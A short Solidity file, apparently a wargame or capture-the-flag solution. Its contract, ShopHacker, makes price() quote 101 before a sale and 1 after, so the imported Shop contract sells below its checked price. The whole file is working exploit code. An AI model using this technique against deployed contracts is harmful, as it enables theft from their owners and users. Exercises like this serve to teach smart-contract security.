// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Buyer, Shop} from "./Shop.sol";

contract ShopHacker is Buyer {
    Shop private _shop;

    constructor(address shopAddress) {
        _shop = Shop(shopAddress);
    }

    function price() external view returns (uint) {
        if (!_shop.isSold()) {
            return 101;
        }
        return 1;
    }

    function buy() external returns(uint256 price) {
        _shop.buy();
        return _shop.price();
    }
}
